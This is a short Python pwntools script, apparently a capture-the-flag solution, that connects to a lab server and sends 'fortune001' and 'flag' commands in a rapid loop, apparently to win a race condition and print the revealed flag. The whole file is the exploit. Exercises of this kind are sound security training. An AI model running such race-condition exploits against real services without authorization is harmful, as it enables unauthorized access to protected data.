from pwn import remote
import re, time

HOST = 'up.zoolab.org'
PORT = 10931


def main():
    io = remote(HOST, PORT)

    io.recvuntil(b'Commands:', timeout=5)

    pattern = re.compile(rb'F> (FLAG\{.*?\})')

    while True:
        io.sendline(b'fortune001')
        io.sendline(b'flag')

        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            break

        m = pattern.search(data)
        if m:
            print(f'Got flag: {m.group(1).decode()}')
            break

    io.close()


if __name__ == '__main__':
    main()
